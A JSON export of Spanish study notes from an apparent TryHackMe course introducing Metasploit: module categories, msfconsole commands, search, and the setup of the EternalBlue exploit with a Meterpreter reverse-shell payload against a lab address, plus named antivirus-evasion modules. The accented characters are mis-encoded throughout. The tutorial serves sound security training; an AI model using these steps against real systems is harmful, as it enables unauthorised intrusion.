    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Working with Modules",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/2-metasploit-introduction/4-working-with-modules/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/2. Metasploit - Introduction/4. Working with Modules.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 2. Metasploit - Introduction",
    "content": "Una vez que hayamos introducido el contexto del m√≥dulo usando el comando `use` seguido del nombre del m√≥dulo, necesitaremos configurar par√°metros. Es buena pr√°ctica usar el comando `sho options` para obtener una lista de los par√°metros requeridos.\n\nTodos se configuran usando la misma sintaxis: `set NOMBRE_PAR√ÅMETRO VALOR`.\n\nAntes de continuar est√° bien comprobar el prompt para asegurarse de que estamos en el contexto correcto. Al usar Metasploit podemos ver 5 prompts diferentes:\n\n- **El prompt normal:** No puedes usar comandos de Metasploit aqu√≠.\n- **El prompt msfconsole:** msf6 es el prompt, pero sin contexto, no se pueden usar comandos espec√≠ficos de contexto, como configurar par√°metros.\n- **El prompt de contexto:** Una vez decidido el m√≥dulo y seleccionado con `use` podemos usar comandos como `set`.\n- **El prompt de Meterpreter:** Meterpreter es un payload muy potente que veremos despu√©s. Esto quiere decir que el sistema objetivo se conect√≥ a ti mediante una agente de Meterpreter.\n- **Una consola en el sistema objetivo:** Una vez que el exploit se ha completado, puede que ganes acceso a una as√≠. Todos los comandos ejecutados en esta consola se ejecutan en el sistema objetivo.\n\nCon `show options` puedes ver los par√°metros requeridos y con `set` configurarlos. Los par√°metros que usar√°s normalmente son:\n\n- **RHOSTS:** Host remoto, la IP del sistema objetivo. Puedes hacerlo con notaci√≥n **CIDR** (/16, /24), con rango (10.10.10.X - 10.10.10.x) o con un archivo que tomar√° un objetivo por linea.\n- **RPORT:** Puerto remoto, el puerto objetivo del sistema objetivo.\n- **PAYLOAD:** La carga de c√≥digo que usaremos con el exploit.\n- **LHOST:** Host local, la IP de nuestro equipo.\n- **LPORT:** Puerto local, el puerto de nuestro equipo elegido para las comunicaciones.\n- **SESSION:** Cada conexi√≥n establecida con el sistema objetivo con Metasploit tendr√° un ID, que usar√°s con los m√≥dulos de post explotaci√≥n para re conectarte a una sesi√≥n existente.\n\nPuedes sobrescribir cualquier par√°metro usando el comando `set` con un valor nuevo o borrarlo usando el comando `unset`. Si quieres borrarlos todos usa `unset all`.\n\nPuedes usar el comando `setg` para establecer valores que se usar√°n para todos los m√≥dulos. Se diferencia en eso del comando `set`.\n\nEl siguiente ejemplo usa el siguiente flujo:\n\n1. Usamos el explotable `ms17_010_eternalblue`.\n2. Configuramos `RHOSTS` usando el comando `setg`.\n3. Usamos el comando `back` para dejar el contexto.\n4. Usamos un `auxiliary` (este m√≥dulo es un esc√°ner para para descubrir vulnerabilidades de `MS17-010`).\n5. El comando `show options` muestra que el par√°metro `RHOSTS` ya tiene configurada la IP del sistema objetivo.\n\n```bash\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue \n[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.10.165.39\nrhosts => 10.10.165.39\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > back\nmsf6 > use auxiliary/scanner/smb/smb_ms17_010 \nmsf6 auxiliary(scanner/smb/smb_ms17_010) > show options\n\nModule options (auxiliary/scanner/smb/smb_ms17_010):\n\n   Name         Current Setting                                                Required  Description\n   ----         ---------------                                                --------  -----------\n   CHECK_ARCH   true                                                           no        Check for architecture on vulnerable hosts\n   CHECK_DOPU   true                                                           no        Check for DOUBLEPULSAR on vulnerable hosts\n   CHECK_PIPE   false                                                          no        Check for named pipe on vulnerable hosts\n   NAMED_PIPES  /opt/metasploit-framework-5101/data/wordlists/named_pipes.txt  yes       List of named pipes to check\n   ******RHOSTS       10.10.165.39******                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'\n   RPORT        445                                                            yes       The SMB service port (TCP)\n   SMBDomain    .                                                              no        The Windows domain to use for authentication\n   SMBPass                                                                     no        The password for the specified username\n   SMBUser                                                                     no        The username to authenticate as\n   THREADS      1                                                              yes       The number of concurrent threads (max one per host)\n\nmsf6 auxiliary(scanner/smb/smb_ms17_010) >\n```\n\nLo que se configura con `setg` se mantiene hasta que sales de metasploit o hasta que usas el comando `unsetg` (o hasta que cambias su valor).\n\n------------------\n<h4>Usar m√≥dulos</h4>\nUna vez que todos los par√°metros de los m√≥dulos est√©n configurados, podemos lanzar el m√≥dulo usando el comando `exploit`. Tambi√©n podemos hacerlo con el comando `run`. El comando `exploit` puede ser usado sin par√°metros o usando el par√°metro `-z` para lanzar el exploit y poner la sesi√≥n en segundo plano tan pronto como se abra.\n\nEsto nos devolver√° al prompt del contexto desde el que hemos ejecutado el exploit. Algunos m√≥dulos soportan la opci√≥n `check`, la cual comprobar√° si el sistema es vulnerable sin necesidad de explotarlo.\n\n------------------------\n<h4>Sesiones</h4>\nUna vez que una vulnerabilidad ha sido explotada exitosamente, se crear√° una sesi√≥n. Este es el canal de comunicaci√≥n entre el sistema objetivo y metasploit. Puedes usar el comando `background` para poner en segundo plano tu sesi√≥n actual. De forma alternativa `Ctrl + Z` puede se usado para el mismo prop√≥sito. \n\nEl comando `sessions` puede ser usado desde el prompt de msfconsole o cualquier contexto para ver las sesiones existentes. Para interactuar con cualquiera de las sesiones puedes usar el comando `sessions -i` seguido del ID de la sesi√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction to Metasploit",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/2-metasploit-introduction/1-introduction-to-metasploit/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/2. Metasploit - Introduction/1. Introduction to Metasploit.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 2. Metasploit - Introduction",
    "content": "Metasploit es uno de los marcos de trabajo m√°s usados. Es una herramienta poderosa que puede aguantar todas las fases del engagement del pentesting, desde la recopilaci√≥n de informaci√≥n hasta la post explotaci√≥n.\n\nMetasploit tiene dos versiones principales:\n\n- **Metasploit Pro**: La versi√≥n comercial que facilita la automatizaci√≥n del manejo de tareas. Esta versi√≥n tiene una interfaz gr√°fica de usuario.\n- **Metasploit Framework**: La versi√≥n de c√≥digo abierto que funciona desde la linea de comandos.\n\nEl Framework Metasploit es un conjunto de herramientas que permite recopilaci√≥n de informaci√≥n, escaneo, explotaci√≥n, desarrollo de explotaci√≥n, post explotaci√≥n y m√°s. Aunque el uso primario de metasploit se centra en el pentesting, tambi√©n es √∫til para la b√∫squeda de vulnerabilidades y desarrollo de exploits.\n\nLos componentes principales de Metasploit pueden ser resumidos de la siguiente manera:\n\n- **msfcosole**: La l√≠nea de comandos principal.\n- **M√≥dulos**: M√≥dulos soportados, como exploits, esc√°ners, payloads, etc.\n- **Herramientas**: Las herramientas en s√≠ que te ayudar√°n a buscar vulnerabilidades y al pentest. Algunas de estas herramientas son msfvenom, patter_create y pattern_offset.\n\nEsta unidad cubrir√° los componentes principales de Metasploit mientras ofrece una base s√≥lida sobre c√≥mo encontrar exploits relevantes, configurar par√°metros y explotar servicios vulnerables en el sistema objetivo.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Main Components of Metasploit",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/2-metasploit-introduction/2-main-components-of-metasploit/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/2. Metasploit - Introduction/2. Main Components of Metasploit.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 2. Metasploit - Introduction",
    "content": "Al usar metasploit, primariamente interactuaremos con la consola de metasploit. Podemos lanzar la consola usando `msfconsole`. Esta ser√° nuestra manera de interactuar con los m√≥dulos de metasploit. Los m√≥dulos son componentes peque√±os dentro del marco de trabajo de metasploit y son construidos para realizar una tarea espec√≠fica, como explotar una vulnerabilidad, escanear un objetivo, o realizar un  ataque de fuerza bruta.\n\nAntes de adentrarnos en los m√≥dulos, ser√≠a de ayuda aclarar algunos conceptos recurrentes: vulnerabilidad, exploit y payload.\n\n- **Exploit**: Una pieza de c√≥digo que usa una vulnerabilidad presente en el sistema objetivo.\n- **Vulnerabilidad**: Un error de dise√±o, programaci√≥n o l√≥gica que afecta al sistema objetivo. La explotaci√≥n de una vulnerabilidad puede resultar en la recopilaci√≥n de informaci√≥n confidencial, o permitir al atacante ejecutar c√≥digo en el sistema objetivo.\n- **Payload**: Un exploit se aprovechar√° de una vulnerabilidad. Sin embargo, si queremos que el exploit tenga el resultado que queremos, necesitamos usar un payload. El payload es el c√≥digo que se ejecutar√° en el sistema objetivo.\n\nLos m√≥dulos y categor√≠as debajo de cada uno est√°n listados abajo. Estos se dan por motivos de referencia, pero interactuar√°s con ellos a trav√©s de la consola de metasploit.\n\n------------------\n<h2>Auxiliary</h2>\nCualquier m√≥dulo de soporte como esc√°ners, crawlers y fuzzers pueden encontrarse aqu√≠.\n\n```bash\nroot@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 auxiliary/\nauxiliary/\n‚îú‚îÄ‚îÄ admin\n‚îú‚îÄ‚îÄ analyze\n‚îú‚îÄ‚îÄ bnat\n‚îú‚îÄ‚îÄ client\n‚îú‚îÄ‚îÄ cloud\n‚îú‚îÄ‚îÄ crawler\n‚îú‚îÄ‚îÄ docx\n‚îú‚îÄ‚îÄ dos\n‚îú‚îÄ‚îÄ example.py\n‚îú‚îÄ‚îÄ example.rb\n‚îú‚îÄ‚îÄ fileformat\n‚îú‚îÄ‚îÄ fuzzers\n‚îú‚îÄ‚îÄ gather\n‚îú‚îÄ‚îÄ parser\n‚îú‚îÄ‚îÄ pdf\n‚îú‚îÄ‚îÄ scanner\n‚îú‚îÄ‚îÄ server\n‚îú‚îÄ‚îÄ sniffer\n‚îú‚îÄ‚îÄ spoof\n‚îú‚îÄ‚îÄ sqli\n‚îú‚îÄ‚îÄ voip\n‚îî‚îÄ‚îÄ vsploit\n\n20 directories, 2 files\n```\n\n---------------------\n<h2>Encoders</h2>\nPermiten encodear el exploit y el payload con la esperanza de que un antivirus basado en firmas no los detecte.\n\nLos antivirus y soluciones de seguridad basadas en firmas tienen una base de amenazas conocidas. Estos comparan los archivos sospechosos con la base de datos y mandan alertas si hay coincidencias. Los encoders tienen una tasa de √©xito limitada porque estos pueden hacer comprobaciones adicionales.\n\n```bash\nroot@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 encoders/\nencoders/\n‚îú‚îÄ‚îÄ cmd\n‚îú‚îÄ‚îÄ generic\n‚îú‚îÄ‚îÄ mipsbe\n‚îú‚îÄ‚îÄ mipsle\n‚îú‚îÄ‚îÄ php\n‚îú‚îÄ‚îÄ ppc\n‚îú‚îÄ‚îÄ ruby\n‚îú‚îÄ‚îÄ sparc\n‚îú‚îÄ‚îÄ x64\n‚îî‚îÄ‚îÄ x86\n\n10 directories, 0 files\n```\n\n----------------\n<h2>Evasion</h2>\nMientras que los encoders encodear√°n el payload, no son considerados un intento directo de evadir el antivirus. Por otro lado, los m√≥dulos de evasi√≥n intentar√°n eso.\n\n```bash\nroot@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 2 evasion/\nevasion/\n‚îî‚îÄ‚îÄ windows\n    ‚îú‚îÄ‚îÄ applocker_evasion_install_util.rb\n    ‚îú‚îÄ‚îÄ applocker_evasion_msbuild.rb\n    ‚îú‚îÄ‚îÄ applocker_evasion_presentationhost.rb\n    ‚îú‚îÄ‚îÄ applocker_evasion_regasm_regsvcs.rb\n    ‚îú‚îÄ‚îÄ applocker_evasion_workflow_compiler.rb\n    ‚îú‚îÄ‚îÄ process_herpaderping.rb\n    ‚îú‚îÄ‚îÄ syscall_inject.rb\n    ‚îú‚îÄ‚îÄ windows_defender_exe.rb\n    ‚îî‚îÄ‚îÄ windows_defender_js_hta.rb\n\n1 directory, 9 files\n```\n\n----------------\n<h2>Exploits</h2>\nLos exploits, organizados por sistema objetivo.\n\n```bash\nroot@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 exploits/\nexploits/\n‚îú‚îÄ‚îÄ aix\n‚îú‚îÄ‚îÄ android\n‚îú‚îÄ‚îÄ apple_ios\n‚îú‚îÄ‚îÄ bsd\n‚îú‚îÄ‚îÄ bsdi\n‚îú‚îÄ‚îÄ dialup\n‚îú‚îÄ‚îÄ example_linux_priv_esc.rb\n‚îú‚îÄ‚îÄ example.py\n‚îú‚îÄ‚îÄ example.rb\n‚îú‚îÄ‚îÄ example_webapp.rb\n‚îú‚îÄ‚îÄ firefox\n‚îú‚îÄ‚îÄ freebsd\n‚îú‚îÄ‚îÄ hpux\n‚îú‚îÄ‚îÄ irix\n‚îú‚îÄ‚îÄ linux\n‚îú‚îÄ‚îÄ mainframe\n‚îú‚îÄ‚îÄ multi\n‚îú‚îÄ‚îÄ netware\n‚îú‚îÄ‚îÄ openbsd\n‚îú‚îÄ‚îÄ osx\n‚îú‚îÄ‚îÄ qnx\n‚îú‚îÄ‚îÄ solaris\n‚îú‚îÄ‚îÄ unix\n‚îî‚îÄ‚îÄ windows\n\n20 directories, 4 files\n```\n\n-------------\n<h2>NOPs</h2>\nLos NOPs (No OPeration) no hacen nada, literalmente. Se representan en la familia Intel x86 con 0x90. la CPU no har√° nada por un ciclo. Normalmente se usan como un buffer para conseguir tama√±os de payload constantes.\n\n```bash\nroot@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 nops/\nnops/\n‚îú‚îÄ‚îÄ aarch64\n‚îú‚îÄ‚îÄ armle\n‚îú‚îÄ‚îÄ cmd\n‚îú‚îÄ‚îÄ mipsbe\n‚îú‚îÄ‚îÄ php\n‚îú‚îÄ‚îÄ ppc\n‚îú‚îÄ‚îÄ sparc\n‚îú‚îÄ‚îÄ tty\n‚îú‚îÄ‚îÄ x64\n‚îî‚îÄ‚îÄ x86\n\n10 directories, 0 files\n```\n\n---------------\n<h2>Payloads</h2>\nLos payloads son c√≥digos que se ejecutan en el sistema objetivo.\n\nLos exploits usar√°n una vulnerabilidad del sistema objetivo, pero para conseguir el resultado deseado, necesitaremos un payload. Lanzar la calculadora ejecutando calc.exe en el sistema objetivo es una forma benigna de demostrar que podemos ejecutar comandos en el equipo objetivo.\n\nEjecutar comandos en el equipo objetivo ya es un paso importante pero tener una conexi√≥n interactiva que permite escribir comandos es mejor. Esto se conoce como una \"reverse shell\".\n\n```bash\nroot@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 payloads/\npayloads/\n‚îú‚îÄ‚îÄ adapters\n‚îú‚îÄ‚îÄ singles\n‚îú‚îÄ‚îÄ stagers\n‚îî‚îÄ‚îÄ stages\n\n4 directories, 0 files\n```\n\nVemos 4 directorios diferentes debajo de \"payloads\": adaptadores, singles, stagers y stages.\n\n- **Adapters**: Un adapter envuelve payloads single para convertirlos en diferentes formatos. Por ejemplo, un payload de tama√±o normal puede  ser envuelto  en  un  Powershell adapter, lo que har√° un s√≥lo comando de powershell que ejecutar√° el c√≥digo.\n- **Singles**: Payloads autocontenidos que no necesitan descargar un componente adicional para ejecutarse.\n- **Stagers**: Responsables de configurar un canal de conexi√≥n entre Metasploit y el sistema ojetivo. √ötil cuando se trabaja con payloads staged. Estos primero subir√°n un stager en el sistema objetivo y despu√©s descargar√°n el resto del payload . Esto ofrece algunas ventajas como el tama√±o del payload.\n- **Stages**: Descargados por el stager. Esto te permitir√° usar payloads de mayor tama√±o.\n\nMetasploit tiene un m√©todo de ayudarte a identificar payloads single (tambi√©n llamados \"inline\") y payloads staged.\n\n- generic/shell_reverse_tcp\n- windows/x64/shell/reverse_tcp\n\nAmbas son shells de Windows. La primera es una inline como est√° indicado por el  \" _ \" entre \"shell\" y \"reverse\". Mientras que la segunda es un payload stage como es indicado por \"/\" entre \"shell\" y \"reverse\".\n\n-------------\n<h2>Post</h2>\nLos m√≥dulos post son √∫tiles en la parte final del proceso de pentesting, post-explotaci√≥n.\n\n```bash\nroot@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 post/\npost/\n‚îú‚îÄ‚îÄ aix\n‚îú‚îÄ‚îÄ android\n‚îú‚îÄ‚îÄ apple_ios\n‚îú‚îÄ‚îÄ bsd\n‚îú‚îÄ‚îÄ firefox\n‚îú‚îÄ‚îÄ hardware\n‚îú‚îÄ‚îÄ linux\n‚îú‚îÄ‚îÄ multi\n‚îú‚îÄ‚îÄ networking\n‚îú‚îÄ‚îÄ osx\n‚îú‚îÄ‚îÄ solaris\n‚îî‚îÄ‚îÄ windows\n\n12 directories, 0 files\n```\n\nSi quieres familiarizarte con estos m√≥dulos puedes encontrarlos en `/opt/metasploit-framework/embedded/framework/modules`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Msfconsole",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/2-metasploit-introduction/3-msfconsole/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/2. Metasploit - Introduction/3. Msfconsole.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics > 2. Metasploit - Introduction",
    "content": "Como ya hemos mencionado, la consola ser¬¥a nuestra interfaz principal. Podemos lanzarla usando el comando `msfconsole`.\n\nUna vez abierta, veremos que la linea de comandos cambia a `msf6`. La l√≠nea de comandos de metasploit puede ser usada como una linea de comandos normal, ejecutando por ejemplo `ls` para listar los contenidos del directorio desde el  cual se lanz√≥. Seguido de un `ping` mandado a Google (8.8.8.8).\n\n```bash\nmsf6 > ls\n[*] exec: ls\n\nburpsuite_community_linux_v2021_8_1.sh\tInstructions  Scripts\nDesktop\t\t\t\t\tPictures      thinclient_drives\nDownloads\t\t\t\tPostman       Tools\nmsf6 > ping -c 1 8.8.8.8\n[*] exec: ping -c 1 8.8.8.8\n\nPING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=109 time=1.33 ms\n\n--- 8.8.8.8 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 1.335/1.335/1.335/0.000 ms\nmsf6 >\n```\n\nSoportar√° la mayor√≠a de comandos Linux, incluyendo `clear`, pero no dejar√° usar ciertas funciones (como la redirecci√≥n `>`).\n\n```bash\nmsf6 > help > help.txt\n[-] No such command\nmsf6 >\n```\n\nEl comando `help` puede ser usado por s√≠ mismo o para un comando espec√≠fico. Debajo un ejemplo para el comando `set`, que veremos m√°s adelante.\n\n```bash\nmsf6 > help set\nUsage: set [option] [value]\n\nSet the given option to value.  If value is omitted, print the current value.\nIf both are omitted, print options that are currently set.\n\nIf run from a module context, this will set the value in the module's\ndatastore.  Use -g to operate on the global datastore.\n\nIf setting a PAYLOAD, this command can take an index from `show payloads'.\n\nmsf6 >\n```\n\nPodemos usar el comando `history` para ver el historial de los comandos ejecutados en la consola.\n\nUna caracter√≠stica importante de msfconsole es que integra autocompletado por tabulaci√≥n, lo que nos ser√° muy √∫til m√°s adelante cuando usemos comandos o m√≥dulos de Metasploit.\n\nMsfconsole es dirigida por contexto; esto significa que al menos que est√©n definidos como variables globales, todos los par√°metros del m√≥dulo se perder√°n si cambias de m√≥dulo. En el ejemplo de abajo hemos usado el exxploit `ms17_010_eternalblue`, y configurado los par√°metros como `RHOSTS`. Si cambi√°semos a otro m√≥dulo, como port scanner, necesitar√≠amos configurar `RHOSTS` de nuevo. Vamos a ver el ejemplo:\n\nUna vez que escribimos el comando `use exploit/windows/smb/ms17_010_eternalblue`, veremos que la linea de comandos cambia de `msf6` a `msf6 exploit(windows/smb/ms17_010_eternalblue)`. El exploit EternalBlue fue dise√±ado por la Agencia Nacional de Seguridad de los EE.UU. (N.S.A.) para una vulnerabilidad que afectaba a los servidores SMBv1 en numerosos sistemas Windows. El protocolo SMB es comunmente usado en las redes Windows para compartir archivos y mandar archivos a impresoras. EternalBlue fue filtrado por la organizaci√≥n cibercriminal \"Shadow Brokers\" en Abril de 2017. En mayo de ese mismo a√±o, esta vulnerabilidad fue explotada a nivel mundial por el ataque de ransomware \"WannaCry\".\n\n```bash\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue \n[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(windows/smb/ms17_010_eternalblue) >\n```\n\nEl m√≥dulo puede ser seleccionado con el comando `use` seguido del n√∫mero al comienzo de la linea de b√∫squeda.\n\nMientras que el prompt ha cambiado, notar√°s que puedes seguir ejecutando comandos como los mencionados anteriormente. Esto significa que no entramos en un directorio como normalmente lo har√≠amos. La linea nos dir√° que tenemos un contexto en el que debemos trabajar. Puedes ver esto escribiendo `show options`.\n\n```bash\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > show options\n\nModule options (exploit/windows/smb/ms17_010_eternalblue):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'\n   RPORT          445              yes       The target port (TCP)\n   SMBDomain      .                no        (Optional) The Windows domain to use for authentication\n   SMBPass                         no        (Optional) The password for the specified username\n   SMBUser                         no        (Optional) The username to authenticate as\n   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.\n   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.\n\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.220.191    yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows 7 and Server 2008 R2 (x64) All Service Packs\n\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) >\n```\n\nEsto mostrar√° opciones relacionadas con el exploit que hemos elegido antes. El comando `show options` tendr√° diferentes salidas dependiendo del contexto en el que sea usado. El ejemplo de arriba muestra que en este exploit, necesitar√≠amos configurar variables como `RHOSTS` y `RPORT`. Por otro lado un m√≥dulo de post-explotaci√≥n, puede que s√≥lo necesite que configuremos un `SESSION ID`. Una sesi√≥n es una conexi√≥n existente al sistema objetivo que el m√≥dulo de post-explotaci√≥n usar√°.\n\n```bash\nmsf6 post(windows/gather/enum_domain_users) > show options\n\nModule options (post/windows/gather/enum_domain_users):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   HOST                      no        Target a specific host\n   SESSION                   yes       The session to run this module on.\n   USER                      no        Target User for NetSessionEnum\n\nmsf6 post(windows/gather/enum_domain_users) >\n```\n\nEl comando `show` puede ser usado en cualquier contexto seguido de un tipo de m√≥dulo (auxiliary, payload, exploit, etc.) para listar los m√≥dulos disponibles.\n\n```bash\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads\n\nCompatible Payloads\n===================\n\n   #   Name                                        Disclosure Date  Rank    Check  Description\n   -   ----                                        ---------------  ----    -----  -----------\n   0   generic/custom                                               manual  No     Custom Payload\n   1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline\n   2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline\n   3   windows/x64/exec                                             manual  No     Windows x64 Execute Command\n   4   windows/x64/loadlibrary                                      manual  No     Windows x64 LoadLibrary Path\n   5   windows/x64/messagebox                                       manual  No     Windows MessageBox x64\n   6   windows/x64/meterpreter/bind_ipv6_tcp                        manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager\n   7   windows/x64/meterpreter/bind_ipv6_tcp_uuid                   manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support \n```\n\nSi se usa desde la prompt de msfconsole, `show` mostrar√° todos los m√≥dulos.\n\nPuedes abandonar el contexto usando el comando `back`.\n\n```bash\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > back\nmsf6 > \n```\n\nPara conseguir m√°s informaci√≥n de cualquier m√≥dulo puedes escribir el comando `info` dentrro de su contexto.\n\n```bash\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > info\n\n       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n     Module: exploit/windows/smb/ms17_010_eternalblue\n   Platform: Windows\n       Arch: \n Privileged: Yes\n    License: Metasploit Framework License (BSD)\n       Rank: Average\n  Disclosed: 2017-03-14\n\nProvided by:\n  Sean Dillon \n  Dylan Davis \n  Equation Group\n  Shadow Brokers\n  thelightcosine\n\nAvailable targets:\n  Id  Name\n  --  ----\n  0   Windows 7 and Server 2008 R2 (x64) All Service Packs\n\nCheck supported:\n  Yes\n\nBasic options:\n  Name           Current Setting  Required  Description\n  ----           ---------------  --------  -----------\n  RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'\n  RPORT          445              yes       The target port (TCP)\n  SMBDomain      .                no        (Optional) The Windows domain to use for authentication\n  SMBPass                         no        (Optional) The password for the specified username\n  SMBUser                         no        (Optional) The username to authenticate as\n  VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.\n  VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.\n\nPayload information:\n  Space: 2000\n\nDescription:\n  This module is a port of the Equation Group ETERNALBLUE exploit, \n  part of the FuzzBunch toolkit released by Shadow Brokers. There is a \n  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is \n  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error \n  where a DWORD is subtracted into a WORD. The kernel pool is groomed \n  so that overflow is well laid-out to overwrite an SMBv1 buffer. \n  Actual RIP hijack is later completed in \n  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may \n  not trigger 100% of the time, and should be run continuously until \n  triggered. It seems like the pool will get hot streaks and need a \n  cool down period before the shells rain in again. The module will \n  attempt to use Anonymous login, by default, to authenticate to \n  perform the exploit. If the user supplies credentials in the \n  SMBUser, SMBPass, and SMBDomain options it will use those instead. \n  On some systems, this module may cause system instability and \n  crashes, such as a BSOD or a reboot. This may be more likely with \n  some payloads.\n\nReferences:\n  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010\n  https://cvedetails.com/cve/CVE-2017-0143/\n  https://cvedetails.com/cve/CVE-2017-0144/\n  https://cvedetails.com/cve/CVE-2017-0145/\n  https://cvedetails.com/cve/CVE-2017-0146/\n  https://cvedetails.com/cve/CVE-2017-0147/\n  https://cvedetails.com/cve/CVE-2017-0148/\n  https://github.com/RiskSense-Ops/MS17-010\n\nAlso known as:\n  ETERNALBLUE\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) >\n```\n\nDe forma alternativa, puedes usar el comando `info` seguido de la ruta al m√≥dulo desde el prompt de msfconsole. `info` no es un men√∫ de ayuda, dar√° informaci√≥n detallada como qui√©n es el autor, fuentes relevantes, etc.\n\n-------------------\n<h2>Search</h2>\nUno de los comandos m√°s √∫tiles que tiene msfconsole es `search`. Este comando buscar√° en la base de datos del Framework de Metasploit por m√≥dulos relevantes al par√°metro dado. Puedes conducir b√∫squedas usando n√∫meros CVE, nombres de exploits o sistema objetivo.\n\n```bash\nmsf6 > search ms17-010\n\nMatching Modules\n================\n\n   #  Name                                      Disclosure Date  Rank     Check  Description\n   -  ----                                      ---------------  ----     -----  -----------\n   0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\n   1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection\n   2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n   3  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution\n\n\nInteract with a module by name or index, for example use 4 or use exploit/windows/smb/smb_doublepulsar_rce\n\nmsf6 >\n```\n\nLa salida del comando `search` ofrece una vista gen√©rica de cada m√≥dulo devuelto. Puede que notes que la columna \"nombre\" ya da m√°s informaci√≥n que el nombre del m√≥dulo. Puedes ver el tipo de m√≥dulo, y la categor√≠a del m√≥dulo. Puedes usar el comando `use` seguido del n√∫mero del m√≥dulo que te devuelve la b√∫squeda (`use 0` en vez de `use auxiliary/admin/smb/ms17_010_command`).\n\nOtra pieza importante de informaci√≥n est√° en la columna \"rank\", que califica los exploits basado en su confiabilidad.\n\n![[136.png]]\n\nPuedes dirigir la funci√≥n de b√∫squeda usando palabras como `type` y `platform`.\n\nPor ejemplo, si quisi√©ramos que nuestros resultados s√≥lo incluyeran m√≥dulos auxiliary, podr√≠amos configurar el tipo a este.\n\n```bash\nmsf6 > search type:auxiliary telnet\n\nMatching Modules\n================\n\n   #   Name                                                Disclosure Date  Rank    Check  Description\n   -   ----                                                ---------------  ----    -----  -----------\n   0   auxiliary/admin/http/dlink_dir_300_600_exec_noauth  2013-02-04       normal  No     D-Link DIR-600 / DIR-300 Unauthenticated Remote Command Execution\n   1   auxiliary/admin/http/netgear_r6700_pass_reset       2020-06-15       normal  Yes    